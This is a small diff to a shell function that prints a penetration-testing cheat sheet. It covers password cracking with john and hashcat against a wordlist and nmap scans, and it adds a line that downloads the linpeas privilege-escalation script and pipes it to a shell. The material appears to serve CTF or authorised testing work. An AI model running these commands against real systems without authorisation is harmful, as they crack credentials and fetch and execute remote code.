@@ -40,6 +40,8 @@ hacksheet() {
 	echo 'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt'
 	echo 'hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt'
 	echo 'https://hashcat.net/wiki/doku.php?id=example_hashes'
+	Title '🐧 Linux'
+	echo 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'
 	Title '🌐 Network'
 	echo "nmap -A $ip"
 	echo "nmap -p- -T4 -v $ip"
